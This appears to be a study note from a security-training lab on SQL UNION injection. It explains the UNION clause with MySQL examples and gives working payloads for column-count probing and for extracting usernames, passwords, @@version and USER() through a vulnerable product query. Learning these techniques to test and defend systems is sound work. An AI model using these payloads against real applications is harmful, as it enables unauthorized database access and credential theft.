---
description: injecting entire SQL queries executed along with the original query
---

# Union Clause & Injection

## Union

[Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements.

```shell-session
mysql> SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
```

```shell-session
mysql> SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

`UNION` combined the output of both `SELECT` statements into one

### Even Columns

`UNION` statement can only operate on `SELECT` statements with an **equal number of columns**

Original request

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

Original + Union

```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

### Un-even Columns

we can put junk data for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

> When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.

For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.

The `products` table has two columns in the above example, so we have to `UNION` with two columns. If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, such that we have the same number of columns:

```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```

## Union Injection

### Detect number of columns

There are two methods of detecting the number of columns:

* Using `ORDER BY`
* Using `UNION`

**Using ORDER BY**

We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

```sql
' order by 1-- -
```

**Using UNION**

Union injection with a different number of columns until we successfully get the results back.

```sql
cn' UNION select 1,2,3-- -
```

### Location of Injection

we need to determine which columns are printed to the page. It is very common that not every column will be displayed back to the user

we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:

```sql
cn' UNION select 1,@@version,3,4-- -
```

<figure><img src="../../.gitbook/assets/image (59) (1).png" alt=""><figcaption></figcaption></figure>

### Assessment

Use a Union injection to get the result of 'user()'

<figure><img src="../../.gitbook/assets/image (38) (1).png" alt=""><figcaption><p>total of 4 columns</p></figcaption></figure>

There are total of 4 columns and displayed 2, 3, and 4 at port code, port city, and port volume repectively

```
cn' UNION select 1,USER(),3,4-- -
```

<figure><img src="../../.gitbook/assets/image (91) (1).png" alt=""><figcaption></figcaption></figure>

